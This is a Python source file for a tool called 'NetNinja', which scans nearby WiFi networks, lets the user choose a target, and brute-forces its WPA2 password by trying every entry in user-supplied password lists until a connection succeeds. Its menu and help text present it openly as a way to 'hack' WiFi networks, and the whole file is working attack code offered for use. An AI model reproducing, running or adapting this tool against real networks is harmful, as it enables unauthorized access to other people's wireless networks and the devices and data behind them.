from asyncio import sleep
from itertools import cycle
import os
from pywifi import PyWiFi, const
from pywifi import Profile
import time
from colorama import Fore, Style
from itertools import cycle
from threading import Thread
from time import sleep
from sys import stdout as terminal

done = False

def animate():
    for c in cycle([Fore.LIGHTYELLOW_EX + '|', Fore.LIGHTYELLOW_EX + '/', Fore.LIGHTYELLOW_EX + '-', Fore.LIGHTYELLOW_EX + '\\']):
        if done:
            break
        terminal.write(Fore.LIGHTGREEN_EX + '\rloading ' + c)
        terminal.flush()
        sleep(0.1)
    terminal.flush()

t = Thread(target=animate)
t.start()
sleep(3)
done = True
os.system('clear')

def list_networks():
    wifi = PyWiFi()
    INF = wifi.interfaces()[0]
    INF.scan()

    time.sleep(2)

    Rscan = INF.scan_results()
    unique_networks = set()
    print(Fore.GREEN + "-----------------------------")
    print(Fore.LIGHTCYAN_EX + "Available Networks:")
    print("    ")

    for i, network in enumerate(Rscan):
        if network.ssid not in unique_networks:
            print(Fore.LIGHTRED_EX, f"{len(unique_networks) + 1}]", Fore.LIGHTYELLOW_EX + network.ssid)

            unique_networks.add(network.ssid)

    return Rscan

def main():
    print(Fore.LIGHTGREEN_EX, '''
                                                                                                                     
 _____   ______    ____  _____   ______           ____        ____  _____   ______        ______   _________________ 
|\    \ |\     \  |    ||\    \ |\     \         |    |  ____|\   \|\    \ |\     \   ___|\     \ /                 /
  \    \| \     \ |    |  \    \| \     \        |    | /    /\    \ \    \| \     \ |     \      \______     ______/
  \|    \  \     ||    |  \|    \  \     |       |    ||    |  |    |\|    \  \     ||     ,_____/|  \( /    /  )/   
   |     \  |    ||    |   |     \  |    | ____  |    ||    |__|    | |     \  |    ||     \--'\_|/   ' |   |   '    
   |      \ |    ||    |   |      \ |    ||    | |    ||    .--.    | |      \ |    ||     /___/|       |   |        
   |    |\ \|    ||    |   |    |\ \|    ||    | |    ||    |  |    | |    |\ \|    ||     \____|\     /   //        
   |____||\_____/||____|   |____||\_____/||\____\|____||____|  |____| |____||\_____/||____ '     /|   /___//         
   |    |/ \|   |||    |   |    |/ \|   ||| |    |    ||    |  |    | |    |/ \|   |||    /_____/ |  |`   |          
   |____|   |___|/|____|   |____|   |___|/ \|____|____||____|  |____| |____|   |___|/|____|     | /  |____|          
     \(       )/    \(       \(       )/      \(   )/    \(      )/     \(       )/    \( |_____|/     \(            
      '       '      '        '       '        '   '      '      '       '       '      '    )/         '            
                                                                                             '                       
                                           
''')

    print(Fore.LIGHTBLUE_EX + "NetNinja©", Fore.CYAN + "                                                                                          V1.0", Fore.LIGHTMAGENTA_EX + "    ABooD125141")
    print("      ")
    print(Fore.LIGHTYELLOW_EX + "Welcome to the HIDEFILE Tool!")
    print("      ")
    while True:
        print(Fore.RED + "[ 1 ]", Fore.LIGHTYELLOW_EX + "HACK A WIFI")
        print(Fore.RED + "[ 2 ]", Fore.LIGHTYELLOW_EX + "HELP")
        print(Fore.RED + "[ 3 ]", Fore.LIGHTYELLOW_EX + "Contact US for a problem")
        print(Fore.RED + "[ 0 ]", Fore.LIGHTYELLOW_EX + "EXIT")
        print(Fore.GREEN + "-----------------------------")
        print()
        option = input(Fore.LIGHTYELLOW_EX + "Select an option: ")

        if option == "1":
            Rscan = list_networks()
            print("    ")
            target_index = int(input(Fore.GREEN + "Enter the number of the target network: ")) - 1

            time.sleep(1)
            print(Fore.GREEN + "-----------------------------")
            print(Fore.LIGHTYELLOW_EX + "Password Files:")
            print("   ")
            print(Fore.LIGHTRED_EX + "Select password input option:")
            print(Fore.RED + "[ 1 ]", Fore.LIGHTYELLOW_EX + "Custom path for password file(s)")
            print(Fore.RED + "[ 2 ]", Fore.LIGHTYELLOW_EX + "Use saved passwords in the tool's directory")
            print("     ")
            password_option = input(Fore.LIGHTGREEN_EX + "Enter your choice: ")

            if password_option == "1":
                time.sleep(1)
                print("     ")
                print(Fore.LIGHTRED_EX + "KEEP HACKING...")
                print(Fore.LIGHTYELLOW_EX+ "--------------------------")
                print(Fore.RED + "[ 1 ]", Fore.LIGHTYELLOW_EX + "A Folder of password list files (TXT)")
                print(Fore.RED + "[ 2 ]", Fore.LIGHTYELLOW_EX + "Single File (TXT)")
                print(Fore.LIGHTYELLOW_EX+ "-----------------------------")
                custom_path_option = input(Fore.LIGHTGREEN_EX + "Select an option: ")
                print("      ")
                if custom_path_option.lower() == "1":
                    folder_path = input(Fore.GREEN + "Enter the path to the folder: ")
                    print("      ")
                    print(Fore.MAGENTA + "All the TXT files")
                    print("      ")
                    passwords = get_custom_passwords_from_folder(folder_path)
                else:
                    file_path = input(Fore.GREEN + "Enter the path to the file: ")
                    passwords = get_custom_passwords(file_path)
            elif password_option == "2":
                print(Fore.LIGHTBLUE_EX+ "------------------------------------------------------")
                passwords = get_saved_passwords()
            else:
                print(Fore.RED + "Invalid option. Please choose a valid option.")
                continue

            target_network = Rscan[target_index]
            print(f"\n{Fore.GREEN}Target Network: {target_network.ssid}{Style.RESET_ALL}\n")

            for password in passwords:
                password = password.strip('\n')
                connect_to_network(target_network, password)

        elif option == "2":
            time.sleep(1)
            print("     ")
            print(Fore.LIGHTRED_EX + "KEEP HACKING...")
            print("     ")
            os.system('clear')
            print(Fore.LIGHTYELLOW_EX + "Help:")
            print(Fore.LIGHTRED_EX + "This tool is designed to hack WiFi networks using a password list.")
            print(Fore.LIGHTBLUE_EX+ "1. Choose the 'Hack Network' option.")
            print(Fore.LIGHTBLUE_EX+ "2. Select the target network from the list.")
            print(Fore.LIGHTBLUE_EX+ "3. Choose the password input option.")
            print(Fore.LIGHTBLUE_EX+ "4. Wait for the tool to attempt each password.")
            print(Fore.LIGHTBLUE_EX+ "5. If the correct password is found, it will be displayed.")
            print(Fore.LIGHTRED_EX + "Abdalrahman125141")
            print("      ")

          
        elif option == '3':
            print(Fore.MAGENTA + "-------------------------------------------------")
            print(Fore.LIGHTYELLOW_EX + "Contact US for a problem at [a6291088@gmail.com]")
            print(Fore.MAGENTA + "-------------------------------------------------")

        elif option == "0":
            print(Fore.LIGHTMAGENTA_EX + "-------------------------------------------------------------------")
            print(Fore.LIGHTYELLOW_EX + "Thank you for using the HIDEFILE Tool!")
            print(Fore.CYAN + "Created by ABDALRAHMAN125141")
            print(Fore.LIGHTMAGENTA_EX + "-------------------------------------------------------------------")
            print(Fore.LIGHTYELLOW_EX + "Have a great day!")
            print()
            time.sleep(1)
            print(Fore.LIGHTYELLOW_EX + "Exiting...")
            time.sleep(1)
            exit()

        else:
            print(Fore.RED + "Invalid option. Please choose a valid option.")

def get_password_files(folder_path='password_list'):
    password_files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
    for i, password_file in enumerate(password_files, 1):
        print(Fore.LIGHTRED_EX, f"{i}]", Fore.LIGHTYELLOW_EX + password_file)

    return password_files

def get_custom_passwords_from_folder(folder_path):
    passwords = []
    if not os.path.exists(folder_path):
        print(Fore.RED + "Folder not found.")
        return passwords

    password_files = get_password_files(folder_path)
    for password_file in password_files:
        file_path = os.path.join(folder_path, password_file)
        with open(file_path, "r", encoding="utf-8") as file:
            passwords.extend(file.readlines())

    return passwords

def get_custom_passwords(file_path):
    passwords = []
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            passwords.extend(file.readlines())
    except FileNotFoundError:
        print(Fore.RED + "Password file not found.")
    return passwords

def get_saved_passwords():
    password_files = get_password_files()
    if not password_files:
        return []
    print("      ")
    selected_file = input(Fore.LIGHTYELLOW_EX + "Select the password file number: ")

    try:
        selected_file = int(selected_file)
        if 1 <= selected_file <= len(password_files):
            file_path = os.path.join('password_list', password_files[selected_file - 1])
            with open(file_path, "r", encoding="utf-8") as file:
                return file.readlines()
        else:
            print(Fore.RED + f"Invalid file number: {selected_file}")
            return []
    except ValueError:
        print(Fore.RED + f"Invalid input: {selected_file}")
        return []

def connect_to_network(target_network, password):
    prof = Profile()
    prof.ssid = target_network.ssid
    prof.auth = const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher = const.CIPHER_TYPE_CCMP
    prof.key = password

    INF.remove_all_network_profiles()
    TEMP_PROF = INF.add_network_profile(prof)
    time.sleep(0.1)
    INF.connect(TEMP_PROF)
    time.sleep(0.3)

    if INF.status() == const.IFACE_CONNECTED:
        time.sleep(0.3)
        print(f"{Fore.GREEN}Password is correct: {password}{Style.RESET_ALL}")
        exit()
    else:
        print(f"{Fore.RED}Wrong password: {password}{Style.RESET_ALL}")

if __name__ == "__main__":
    wifi = PyWiFi()
    INF = wifi.interfaces()[0]

    main()
